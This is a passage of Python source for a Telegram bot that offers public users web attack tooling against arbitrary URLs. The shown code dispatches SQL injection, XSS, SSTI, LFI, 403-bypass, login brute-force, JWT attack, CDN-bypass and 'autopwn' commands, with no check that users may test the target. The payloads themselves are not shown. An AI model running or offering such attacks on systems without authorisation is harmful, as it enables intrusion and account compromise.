    await update.effective_message.reply_text(
        f"📥 *Download Mode ရွေးပါ*\n\n"
        f"🔗 `{url[:60]}`\n"
        f"🌐 `{domain}`\n\n"
        "_Mode မသေချာရင် Single Page ကနေ စပါ_",
        reply_markup=kb,
        parse_mode='Markdown'
    )


async def dl_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback for /dl mode selection keyboard"""
    query = update.callback_query
    await query.answer()
    data  = query.data   # dl_single / dl_full / dl_js / dl_jsful / dl_cancel
    url   = context.user_data.get('dl_url', '')

    if data == "dl_cancel" or not url:
        await query.edit_message_text("❌ Download cancelled.")
        return

    mode_map = {
        "dl_single": (False, False),
        "dl_full":   (True,  False),
        "dl_js":     (False, True),
        "dl_jsful":  (True,  True),
    }
    full_site, use_js = mode_map.get(data, (False, False))
    mode_label = {
        "dl_single": "📄 Single Page",
        "dl_full":   "🌐 Full Site",
        "dl_js":     "⚡ JS Single",
        "dl_jsful":  "🚀 JS Full Site",
    }.get(data, "")

    await query.edit_message_text(
        f"⏳ *{mode_label} Download — Queued*\n🔗 `{url[:60]}`",
        parse_mode='Markdown'
    )
    await enqueue_download(update, context, url, full_site=full_site, use_js=use_js)


# ────────────────────────────────────────────────
# /scan  —  Security Scanner
# Replaces: /vuln + /fuzz + /smartfuzz + /bypass403
# ────────────────────────────────────────────────

async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/scan <url> [mode]
    Modes: vuln(default) | fuzz | smart | bypass
    Replaces: /vuln /fuzz /smartfuzz /bypass403
    """
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return

    args  = context.args or []
    url   = args[0].strip() if args else ""
    mode  = args[1].lower() if len(args) > 1 else "vuln"

    # ── Show help BEFORE setting _active_scans (bug fix: stuck state) ──
    if not url:
        await update.effective_message.reply_text(
            "🔍 *Security Scanner*\n\n"
            "```\n/scan <url> [mode]\n```\n\n"
            "*Modes:*\n"
            "  `vuln`   — Vulnerability scan (default)\n"
            "  `fuzz`   — Path & param fuzzer\n"
            "  `smart`  — Smart context-aware fuzzer\n"
            "  `bypass` — 403 bypass tester\n\n"
            "*Examples:*\n"
            "  `/scan https://example.com`\n"
            "  `/scan https://example.com fuzz`\n"
            "  `/scan https://example.com bypass`",
            parse_mode='Markdown'
        )
        return

    _active_scans[uid] = "Full Scan"

    if not url.startswith('http'):
        url = 'https://' + url

    # Delegate to existing command handlers (reuse context/update)
    context.args = [url] + args[2:]   # pass remaining args

    if mode in ("vuln", "v"):
        await cmd_vuln(update, context)
    elif mode in ("fuzz", "f"):
        await cmd_fuzz(update, context)
    elif mode in ("smart", "smartfuzz", "sf"):
        await cmd_smartfuzz(update, context)
    elif mode in ("bypass", "403", "b"):
        context.args = [url]
        await cmd_bypass403(update, context)
    else:
        await update.effective_message.reply_text(
            f"❓ Unknown mode: `{mode}`\n\n"
            "Modes: `vuln` `fuzz` `smart` `bypass`",
            parse_mode='Markdown'
        )
    _active_scans.pop(uid, None)


# ────────────────────────────────────────────────
# /recon  —  Reconnaissance
# Replaces: /tech + /headers + /whois + /cookies + /robots + /links
# ────────────────────────────────────────────────

async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/recon <url> [mode]
    Modes: all(default) | tech | headers | whois | cookies | robots | links
    """
    if not await check_force_join(update, context):
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Recon"

    args = context.args or []
    url  = args[0].strip() if args else ""
    mode = args[1].lower() if len(args) > 1 else "all"

    if not url:
        await update.effective_message.reply_text(
            "🕵️ *Recon Command*\n\n"
            "```\n/recon <url> [mode]\n```\n\n"
            "*Modes:*\n"
            "  `all`     — Full recon (default) — tech+headers+whois\n"
            "  `tech`    — Tech stack fingerprint\n"
            "  `headers` — HTTP security headers\n"
            "  `whois`   — Domain WHOIS / IP info\n"
            "  `cookies` — Cookie security flags\n"
            "  `robots`  — robots.txt viewer\n"
            "  `links`   — Page link extractor\n\n"
            "*Examples:*\n"
            "  `/recon https://example.com`\n"
            "  `/recon https://example.com tech`\n"
            "  `/recon https://example.com cookies`",
            parse_mode='Markdown'
        )
        _active_scans.pop(uid, None)   # fix: no-url early exit
        return

    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        _active_scans.pop(uid, None)   # fix
        return

    context.args = [url]

    if mode == "tech":
        await cmd_tech(update, context)
    elif mode in ("headers", "hdr"):
        await cmd_headers(update, context)
    elif mode == "whois":
        context.args = [urlparse(url).hostname]
        await cmd_whois(update, context)
    elif mode in ("cookies", "cookie"):
        await cmd_cookies(update, context)
    elif mode in ("robots", "robot"):
        await cmd_robots(update, context)
    elif mode in ("links", "link"):
        await cmd_links(update, context)
    elif mode == "all":
        # Run tech + headers + whois in sequence
        domain = urlparse(url).hostname
        await update.effective_message.reply_text(
            f"🕵️ *Full Recon — `{domain}`*\n\n"
            "Running: tech → headers → whois\n⏳",
            parse_mode='Markdown'
        )
        context.args = [url]
        await cmd_tech(update, context)
        await cmd_headers(update, context)
        context.args = [domain]
        await cmd_whois(update, context)

        # ── /recon all: JSON combined report ──────
        import io as _io
        _recon_data = {
            "target": url, "domain": domain,
            "scanned_at": datetime.now().isoformat(),
            "mode": "all (tech + headers + whois)"
        }
        _rj = json.dumps(_recon_data, indent=2, default=str)
        _rb = _io.BytesIO(_rj.encode())
        _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        _sd = re.sub(r'[^\w\-]', '_', domain)
        await context.bot.send_document(
            chat_id=update.effective_chat.id, document=_rb,
            filename=f"recon_{_sd}_{_ts}.json",
            caption=f"🕵️ Recon Report — `{domain}`",
            parse_mode='Markdown'
        )
    else:
        await update.effective_message.reply_text(
            f"❓ Unknown mode: `{mode}`\n\n"
            "Modes: `all` `tech` `headers` `whois` `cookies` `robots` `links`",
            parse_mode='Markdown'
        )
    _active_scans.pop(uid, None)


# ────────────────────────────────────────────────
# /discover  —  Discovery / Enumeration
# Replaces: /api + /extract + /subdomains
# ────────────────────────────────────────────────

async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/discover <url> [mode]
    Modes: all(default) | api | secrets | subs | full
    Replaces: /api /extract /subdomains
    V23: Rate limit fix + parallel all mode + full mode + combined report
    """
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Discover"

    uid  = update.effective_user.id
    args = context.args or []
    url  = args[0].strip() if args else ""
    mode = args[1].lower() if len(args) > 1 else "all"

    if not url:
        await update.effective_message.reply_text(
            "🔎 *Discover Command — V23*\n\n"
            "```\n/discover <url> [mode]\n```\n\n"
            "*Modes:*\n"
            "  `all`     — API + Subdomains (parallel) ✨\n"
            "  `api`     — API endpoint discovery\n"
            "  `secrets` — Secret/key scanner (JS bundles)\n"
            "  `subs`    — Subdomain enumeration (4 sources)\n"
            "  `full`    — api + subs + secrets + sqli + xss 🔥\n\n"
            "*Examples:*\n"
            "  `/discover https://example.com`\n"
            "  `/discover https://example.com subs`\n"
            "  `/discover https://example.com full`",
            parse_mode='Markdown'
        )
        return

    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ✅ V23 Fix: Rate limit ONCE here — sub-commands use _discover_internal flag
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Set internal flag so sub-commands skip their own rate limit
    context.user_data['_discover_internal'] = True

    domain = urlparse(url).hostname
    context.args = [url]

    try:
        # ── Single modes: delegate directly ──────────
        if mode in ("api", "endpoints"):
            await cmd_api(update, context)

        elif mode in ("secrets", "extract", "keys"):
            await cmd_extract(update, context)

        elif mode in ("subs", "subdomains", "sub"):
            context.args = [domain]
            await cmd_subdomains(update, context)

        # ── All mode: PARALLEL api + subs ────────────
        elif mode == "all":
            status_msg = await update.effective_message.reply_text(
                f"🔎 *Full Discovery — `{domain}`*\n\n"
                f"🔌 API scan + 📡 Subdomain enum running in parallel...\n⏳",
                parse_mode='Markdown'
            )

            api_pq  = []
            subs_pq = []

            async def _run_api_parallel():
                return await asyncio.to_thread(
                    discover_api_endpoints, url, lambda t: api_pq.append(t)
                )

            async def _run_subs_parallel():
                return await asyncio.to_thread(_subdomains_sync, domain, subs_pq)

            # ✅ Both run at same time
            api_result, subs_result = await asyncio.gather(
                _run_api_parallel(),
                _run_subs_parallel(),
                return_exceptions=True
            )

            # ── Combined summary ──────────────────────
            lines = [
                f"🔎 *Full Discovery — `{domain}`*",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`\n",
            ]

            # API summary
            if isinstance(api_result, Exception):
                lines.append(f"🔌 *API:* ❌ Error — `{api_result}`")
            else:
                eps = api_result.get("found", [])
                st  = api_result.get("stats", {})
                json_n    = st.get("json_apis", 0)
                gql_n     = st.get("graphql", 0)
                prot_n    = st.get("protected", 0)
                cfg_n     = st.get("config_leaks", 0)
                smap_n    = st.get("source_maps", 0)
                lines.append(f"🔌 *API Endpoints — `{len(eps)}` found*")
                lines.append(f"  ✅ JSON APIs: `{json_n}` | GraphQL: `{gql_n}`")
                lines.append(f"  🔒 Protected: `{prot_n}` | ⚠️ Config Leaks: `{cfg_n}`")
                if smap_n:
                    lines.append(f"  🗺 Source Maps Exposed: `{smap_n}` 🔴")
                # Top 5 high-risk endpoints
                high_risk = sorted(eps, key=lambda e: e.get("risk", 0), reverse=True)
                if high_risk and high_risk[0].get("risk", 0) > 0:
                    lines.append(f"\n  *🔴 Top Risk Endpoints:*")
                    for e in high_risk[:5]:
                        path  = urlparse(e["url"]).path or e["url"]
                        rsk   = e.get("risk", 0)
                        ttype = e.get("type", "")
                        wflag = " ⚠️WRITE" if "WRITE" in e.get("allow_methods", "") else ""
                        lines.append(f"  `{path}` [{ttype}] risk:`{rsk}`{wflag}")
                lines.append("")

            # Subdomains summary
            if isinstance(subs_result, Exception):
                lines.append(f"📡 *Subdomains:* ❌ Error — `{subs_result}`")
            else:
                total_subs = subs_result.get("total_unique", 0)
                http_st    = subs_result.get("http_status", {})
                live_http  = [h for h, d in http_st.items() if d.get("status") == 200]
                interesting = subs_result.get("interesting", [])
                otx_c  = len(subs_result.get("alienvault_otx", []))
                crt_c  = len(subs_result.get("crtsh", []))
                ht_c   = len(subs_result.get("hackertarget", []))
                bf_c   = len(subs_result.get("bruteforce", []))
                wc     = subs_result.get("wildcard_detected", False)
                lines.append(f"📡 *Subdomains — `{total_subs}` unique*")
                lines.append(f"  crt.sh:`{crt_c}` HT:`{ht_c}` OTX:`{otx_c}` BF:`{bf_c}`")
                lines.append(f"  🟢 Live HTTP: `{len(live_http)}`"
                             f"{'  ⚠️ Wildcard filtered' if wc else ''}")
                if interesting:
                    lines.append(f"\n  *🔴 Interesting Subdomains ({len(interesting)}):*")
                    for h in interesting[:8]:
                        info  = http_st.get(h, {})
                        title = info.get("title", "")
                        lines.append(f"  `{h}` {('— ' + title) if title else ''}")
                lines.append("")

            lines.append("📄 _Full reports sent as separate files below_")
            await status_msg.edit_text("\n".join(lines), parse_mode='Markdown')

            # Send detailed reports separately
            if not isinstance(api_result, Exception):
                context.args = [url]
                context.user_data['_discover_skip_msg'] = True
                await _send_api_report(update, context, domain, api_result)

            if not isinstance(subs_result, Exception):
                context.args = [domain]
                await _send_subs_report(update, context, domain, subs_result)

        # ── Full mode: api + subs + secrets + sqli + xss ─
        elif mode in ("full", "deep"):
            status_msg = await update.effective_message.reply_text(
                f"🔥 *Full Deep Scan — `{domain}`*\n\n"
                f"Running: API + Subdomains + Secrets + SQLi + XSS\n"
                f"This may take 2-5 minutes...\n⏳",
                parse_mode='Markdown'
            )

            api_pq   = []
            subs_pq  = []
            sqli_pq  = []
            xss_pq   = []

            # Run all 4 in parallel
            api_r, subs_r, sqli_r, xss_r = await asyncio.gather(
                asyncio.to_thread(discover_api_endpoints, url, lambda t: api_pq.append(t)),
                asyncio.to_thread(_subdomains_sync, domain, subs_pq),
                asyncio.to_thread(_sqli_scan_sync, url, sqli_pq),
                asyncio.to_thread(_xss_scan_sync, url, xss_pq),
                return_exceptions=True
            )

            lines = [
                f"🔥 *Deep Discovery — `{domain}`*",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`\n",
            ]

            # API
            if not isinstance(api_r, Exception):
                eps = api_r.get("found", [])
                st  = api_r.get("stats", {})
                lines.append(f"🔌 *API:* `{len(eps)}` endpoints | "
                             f"JSON:`{st.get('json_apis',0)}` "
                             f"Protected:`{st.get('protected',0)}`"
                             f"{' 🔴CONFIG' if st.get('config_leaks',0) else ''}"
                             f"{' 🗺SRCMAP' if st.get('source_maps',0) else ''}")

            # Subdomains
            if not isinstance(subs_r, Exception):
                total_s = subs_r.get("total_unique", 0)
                interesting_s = subs_r.get("interesting", [])
                lines.append(f"📡 *Subs:* `{total_s}` unique | "
                             f"🔴 Interesting: `{len(interesting_s)}`")

            # SQLi
            if not isinstance(sqli_r, Exception):
                sqli_total = sqli_r.get("total_found", 0)
                sqli_sev   = "🔴 VULNERABLE" if sqli_total > 0 else "✅ Clean"
                lines.append(f"💉 *SQLi:* {sqli_sev} (`{sqli_total}` found)")
            else:
                lines.append("💉 *SQLi:* ❌ Error")

            # XSS
            if not isinstance(xss_r, Exception):
                xss_total = xss_r.get("total_found", 0)
                xss_sev   = "🔴 VULNERABLE" if xss_total > 0 else "✅ Clean"
                lines.append(f"🎭 *XSS:* {xss_sev} (`{xss_total}` found)")
            else:
                lines.append("🎭 *XSS:* ❌ Error")

            # Overall risk score
            risk = 0
            if not isinstance(sqli_r, Exception): risk += sqli_r.get("total_found", 0) * 30
            if not isinstance(xss_r,  Exception): risk += xss_r.get("total_found", 0) * 20
            if not isinstance(api_r,  Exception):
                risk += api_r.get("stats", {}).get("config_leaks", 0) * 40
                risk += api_r.get("stats", {}).get("source_maps", 0) * 30
            severity = ("🔴 CRITICAL" if risk >= 60 else
                       "🟠 HIGH"     if risk >= 30 else
                       "🟡 MEDIUM"   if risk > 0  else "✅ LOW")
            lines.append(f"\n🎯 *Overall Risk: {severity}* (score: `{risk}`)")
            lines.append("📄 _Detailed reports sent separately_")

            await status_msg.edit_text("\n".join(lines), parse_mode='Markdown')

            # Send individual detailed reports
            if not isinstance(api_r, Exception):
                await _send_api_report(update, context, domain, api_r)
            if not isinstance(subs_r, Exception):
                await _send_subs_report(update, context, domain, subs_r)

        else:
            await update.effective_message.reply_text(
                f"❓ Unknown mode: `{mode}`\n\n"
                "Modes: `all` `api` `secrets` `subs` `full`",
                parse_mode='Markdown'
            )
    finally:
        # Always clear internal flag
        _active_scans.pop(uid, None)
        context.user_data.pop('_discover_internal', None)


async def _send_api_report(update, context, domain: str, result: dict):
    """Send API discovery JSON report as file."""
    try:
        endpoints = result.get("found", [])
        js_mined  = result.get("js_mined", [])
        html_mined= result.get("html_mined", [])
        robots    = result.get("robots", [])
        stats     = result.get("stats", {})
        if not endpoints and not js_mined:
            return
        safe_domain = re.sub(r'[^\w\-]', '_', domain)
        ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
        export_data = {
            "domain": domain, "scanned_at": datetime.now().isoformat(),
            "stats": stats,
            "endpoints": [{
                "url": e["url"], "type": e["type"], "status": e["status"],
                "cors": e.get("cors"), "preview": e.get("preview","")[:200],
                "size_b": e.get("size_b", 0), "risk": e.get("risk", 0),
                "allow_methods": e.get("allow_methods", ""),
            } for e in endpoints],
            "js_mined":   list(set(js_mined)),
            "html_mined": list(set(html_mined)),
            "robots":     robots,
        }
        buf = io.BytesIO(json.dumps(export_data, indent=2, ensure_ascii=False).encode())
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=buf,
            filename=f"api_{safe_domain}_{ts}.json",
            caption=(
                f"🔌 *API Report — `{domain}`*\n"
                f"Endpoints: `{len(endpoints)}` | "
                f"JSON: `{stats.get('json_apis',0)}` | "
                f"Protected: `{stats.get('protected',0)}` | "
                f"Config Leaks: `{stats.get('config_leaks',0)}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as _e:
        logging.debug("Scan error: %s", _e)


async def _send_subs_report(update, context, domain: str, data: dict):
    """Send subdomain enumeration ZIP report."""
    try:
        all_unique = data.get("all_unique", [])
        resolved   = data.get("resolved", {})
        http_st    = data.get("http_status", {})
        total      = data.get("total_unique", 0)
        wc         = data.get("wildcard_detected", False)
        if not all_unique:
            return
        ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_d = re.sub(r'[^\w\-]', '_', domain)
        txt_content  = "\n".join(
            f"{h}\t{resolved.get(h,'?')}" for h in all_unique
        )
        json_content = json.dumps({
            "domain": domain, "scanned_at": datetime.now().isoformat(),
            "total_unique": total, "wildcard_detected": wc,
            "sources": {
                "crtsh": len(data.get("crtsh", [])),
                "hackertarget": len(data.get("hackertarget", [])),
                "alienvault_otx": len(data.get("alienvault_otx", [])),
                "bruteforce": len(data.get("bruteforce", [])),
            },
            "subdomains": [{
                "hostname": h, "ip": resolved.get(h, "?"),
                "http_status": http_st.get(h, {}).get("status"),
                "scheme":      http_st.get(h, {}).get("scheme"),
                "server":      http_st.get(h, {}).get("server", ""),
                "title":       http_st.get(h, {}).get("title", ""),
                "interesting": http_st.get(h, {}).get("interesting", False),
            } for h in all_unique],
        }, indent=2)
        interesting = [h for h in all_unique
                       if any(k in h for k in
                              ("dev","staging","admin","internal","test","backup","api","panel","db","jenkins"))]
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("subdomains.txt",  txt_content.encode())
            zf.writestr("subdomains.json", json_content.encode())
            zf.writestr("interesting.txt", "\n".join(interesting).encode())
        zip_buf.seek(0)
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buf,
            filename=f"subdomains_{safe_d}_{ts}.zip",
            caption=(
                f"📡 *Subdomains — `{domain}`*\n"
                f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
                f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
            ),
            parse_mode='Markdown'
        )
    except Exception as _e:
        logging.debug("Scan error: %s", _e)


# ────────────────────────────────────────────────
# /sys  —  System Admin
# Replaces: /clean + /disk + /logs  (admin only)
# ────────────────────────────────────────────────

async def cmd_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sys [mode] — System management (admin only)
    Modes: status(default) | clean | logs [n]
    Replaces: /clean /disk /logs
    """
    if not await verify_admin(update):
        return

    args = context.args or []
    mode = args[0].lower() if args else "status"

    if mode in ("status", "disk", ""):
        await cmd_disk(update, context)
    elif mode in ("clean", "cleanup"):
        await cmd_clean(update, context)
    elif mode in ("logs", "log"):
        context.args = args[1:]
        await cmd_logs(update, context)
    else:
        await update.effective_message.reply_text(
            "⚙️ *System Admin*\n\n"
            "`/sys`          — Storage status\n"
            "`/sys clean`    — Cleanup downloads\n"
            "`/sys logs [n]` — View last n log lines",
            parse_mode='Markdown'
        )


# ────────────────────────────────────────────────
# /adminset  —  Admin Settings
# Replaces: /setlimit + /setpages + /setassets
# ────────────────────────────────────────────────

async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/adminset <type> <value>
    Types: limit | pages | assets
    Replaces: /setlimit /setpages /setassets
    """
    if not await verify_admin(update):
        return

    args = context.args or []

    if len(args) < 2:
        await update.effective_message.reply_text(
            "⚙️ *Admin Settings*\n\n"
            "`/adminset limit <n>`  — Daily download limit (0=∞)\n"
            "`/adminset pages <n>`  — Max crawl pages\n"
            "`/adminset assets <n>` — Max assets per site\n\n"
            "*Current usage:*\n"
            "  `/adminset limit <uid> <n>` — Per-user limit",
            parse_mode='Markdown'
        )
        return

    type_ = args[0].lower()
    context.args = args[1:]

    if type_ in ("limit", "lim"):
        await cmd_setlimit(update, context)
    elif type_ in ("pages", "page"):
        await cmd_setpages(update, context)
    elif type_ in ("assets", "asset"):
        await cmd_setassets(update, context)
    else:
        await update.effective_message.reply_text(
            f"❓ Unknown type: `{type_}`\nTypes: `limit` `pages` `assets`",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 🚀  MAIN
# ══════════════════════════════════════════════════


def main():
    # ── Single-instance lock (prevents Conflict on Railway redeploy) ──────
    import fcntl
    _lock_file_path = os.path.join(DATA_DIR, "bot.lock")
    _lock_file = open(_lock_file_path, "w")
    try:
        fcntl.flock(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _lock_file.write(str(os.getpid()))
        _lock_file.flush()
    except OSError:
        print("❌ Another bot instance is already running (lock file held). Exiting.")
        logger.error("Startup blocked — another instance holds the lock at %s", _lock_file_path)
        return

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("═"*55)
        print("❌  TOKEN ထည့်ဖို့ မမေ့ပါနဲ့ (Line 70 တွင် directly ထည့်ပါ)")
        print("═"*55)
        return

    # ── Build app with Railway-optimized timeouts ─────
    request = HTTPXRequest(
        connection_pool_size   = 16,   # Railway stable network → higher pool
        connect_timeout        = 20.0,
        read_timeout           = 30.0,
        write_timeout          = 30.0,
        pool_timeout           = 20.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .build()
    )

    # ── Init asyncio primitives (event loop must be running) ─
    global download_semaphore, scan_semaphore, _active_scans, db_lock, _dl_queue
    download_semaphore = asyncio.Semaphore(MAX_WORKERS)
    scan_semaphore     = asyncio.Semaphore(1)   # 1 scan at a time — queue system
    db_lock            = asyncio.Lock()
    _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)

    # ════════════════════════════════════════════
    # 📋  COMMAND HANDLERS
    # ════════════════════════════════════════════

    # ── Core ──────────────────────────────────────
    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("help",      cmd_help))
    app.add_handler(CommandHandler("status",    cmd_status))
    app.add_handler(CommandHandler("history",   cmd_history))
    app.add_handler(CommandHandler("mystats",   cmd_mystats))
    app.add_handler(CommandHandler("stop",      cmd_stop))
    app.add_handler(CommandHandler("resume",    cmd_resume))

    # ── Download (merged: /download /fullsite /jsdownload /jsfullsite) ──
    app.add_handler(CommandHandler("dl",        cmd_dl))

    # ── Security Scanner (merged: /vuln /fuzz /smartfuzz /bypass403) ──
    app.add_handler(CommandHandler("scan",      cmd_scan))

    # ── Recon (merged: /tech /headers /whois /cookies /robots /links) ──
    app.add_handler(CommandHandler("recon",     cmd_recon))

    # ── Discovery (merged: /api /extract /subdomains) ──
    app.add_handler(CommandHandler("discover",  cmd_discover))

    # ── Monitoring ────────────────────────────────
    app.add_handler(CommandHandler("monitor",   cmd_monitor))

    # ── Standalone tools ──────────────────────────
    app.add_handler(CommandHandler("screenshot",cmd_screenshot))
    app.add_handler(CommandHandler("appassets", cmd_appassets))
    app.add_handler(CommandHandler("jwtattack", cmd_jwtattack))

    # ── Admin ─────────────────────────────────────
    app.add_handler(CommandHandler("admin",     cmd_admin))
    app.add_handler(CommandHandler("ban",       cmd_ban))
    app.add_handler(CommandHandler("unban",     cmd_unban))
    app.add_handler(CommandHandler("userinfo",  cmd_userinfo))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("allusers",  cmd_allusers))
    app.add_handler(CommandHandler("setforcejoin", cmd_setforcejoin))
    app.add_handler(CommandHandler("sys",       cmd_sys))       # merged: /clean /disk /logs
    app.add_handler(CommandHandler("adminset",  cmd_adminset))  # merged: /setlimit /setpages /setassets

    # ── File upload handler ────────────────────────
    app.add_handler(MessageHandler(filters.Document.ALL, handle_app_upload))

    # ── V20 New Feature Commands ──────────────────
    app.add_handler(CommandHandler("techstack",  cmd_techstack))
    app.add_handler(CommandHandler("sqli",       cmd_sqli))
    app.add_handler(CommandHandler("xss",        cmd_xss))
    app.add_handler(CommandHandler("cloudcheck", cmd_cloudcheck))
    app.add_handler(CommandHandler("paramfuzz",  cmd_paramfuzz))
    app.add_handler(CommandHandler("autopwn",    cmd_autopwn))
    # ── V26 New Features ──────────────────────────
    app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
    app.add_handler(CommandHandler("sourcemap",  cmd_sourcemap))
    app.add_handler(CommandHandler("gitexposed", cmd_gitexposed))
    # ── v28.1 New Scanners ────────────────────────
    app.add_handler(CommandHandler("ssti",         cmd_ssti))
    app.add_handler(CommandHandler("cors",         cmd_cors))
    app.add_handler(CommandHandler("openredirect", cmd_openredirect))
    app.add_handler(CommandHandler("lfi",          cmd_lfi))
    app.add_handler(CommandHandler("secretscan",   cmd_secretscan))
    app.add_handler(CommandHandler("ssltls",       cmd_ssltls))

    # ── Callbacks ─────────────────────────────────
    app.add_handler(CallbackQueryHandler(force_join_callback,    pattern="^fj_check$"))
    app.add_handler(CallbackQueryHandler(appassets_cat_callback, pattern="^apa_"))
    app.add_handler(CallbackQueryHandler(admin_callback,         pattern="^adm_"))
    app.add_handler(CallbackQueryHandler(dl_mode_callback,       pattern="^dl_"))   # /dl keyboard
    app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))
    # Custom wordlist upload

    # ── Global error handler ──────────────────────
    app.add_error_handler(error_handler)

    print("╔══════════════════════════════════════════╗")
    print("║  Website Downloader Bot v28.1 Railway    ║")
    print(f"║  /sqli     ← SQL Injection (GET/POST/Hdr)║")
    print(f"║  /xss      ← XSS (Reflected/Form/Header) ║")
    print(f"║  /ssti     ← Template Injection (NEW)    ║")
    print(f"║  /cors     ← CORS Misconfig (NEW)        ║")
    print(f"║  /openredirect← Open Redirect (NEW)      ║")
    print(f"║  /lfi      ← File Inclusion (NEW)        ║")
    print(f"║  ─────────────────────────────────────── ║")
    print(f"║  SSRF + Path Traversal: ✅               ║")
    print(f"║  SECRET_KEY persistent: ✅               ║")
    print(f"║  Log Rotation 5MB×3:    ✅               ║")
    print(f"║  Rate Limit: ✅ ({RATE_LIMIT_SEC}s)              ║")
    _db_type = "SQLite (WAL)" if os.path.exists(SQLITE_FILE) else "SQLite (init)"
    print(f"║  Database  : {_db_type:<35} ║")
    print(f"║  JS Puppeteer: {'✅' if PUPPETEER_OK else '❌ (optional)'}                        ║")
    print("╚══════════════════════════════════════════╝")

    # ── Bug fix: _start_background defined OUTSIDE retry loop ──
    async def _start_background(application):
        """Background tasks + set bot command list"""
        global _monitor_app_ref
        _monitor_app_ref = application
        asyncio.create_task(queue_worker())
        asyncio.create_task(auto_delete_loop())
        asyncio.create_task(monitor_loop())
        logger.info("Background tasks started (queue worker + auto-delete + monitor)")

        # ── Register bot commands (Telegram "/" menu) ──────────────────
        from telegram import BotCommand, BotCommandScopeDefault, BotCommandScopeChat

        # ── User commands (all users မြင်ရ) ────────────────────────────
        user_commands = [
            BotCommand("start",        "🚀 Bot စတင်ရန်"),
            BotCommand("help",         "📚 Commands အားလုံးကြည့်ရန်"),
            BotCommand("dl",           "📥 Website download"),
            BotCommand("scan",         "🔍 Security scan"),
            BotCommand("recon",        "🌐 Reconnaissance"),
            BotCommand("discover",     "🔎 Subdomain / API discovery"),
            BotCommand("techstack",    "🔬 Tech fingerprint"),
            BotCommand("sqli",         "💉 SQL Injection test"),
            BotCommand("xss",          "🎯 XSS scanner"),
            BotCommand("ssti",         "🔥 Template injection"),
            BotCommand("cors",         "🌐 CORS misconfiguration"),
            BotCommand("openredirect", "🔀 Open redirect scan"),
            BotCommand("lfi",          "📂 File inclusion scan"),
            BotCommand("secretscan",   "🔑 API keys & secrets finder"),
            BotCommand("ssltls",       "🔒 SSL/TLS config scanner"),
            BotCommand("cloudcheck",   "☁️ Real IP / CDN bypass"),
            BotCommand("paramfuzz",    "🧪 Parameter fuzzer"),
            BotCommand("autopwn",      "⚡ Auto pentest chain"),
            BotCommand("bruteforce",   "🔑 Login brute force"),
            BotCommand("gitexposed",   "📁 Git exposure finder"),
            BotCommand("sourcemap",    "🗺️ Source map extractor"),
            BotCommand("jwtattack",    "🔐 JWT attack"),
            BotCommand("screenshot",   "📸 Website screenshot"),
            BotCommand("monitor",      "👁️ Website monitor"),
            BotCommand("appassets",    "📦 App asset analyzer"),
            BotCommand("history",      "📜 Download history"),
            BotCommand("mystats",      "📊 My stats"),
            BotCommand("status",       "ℹ️ Bot status"),
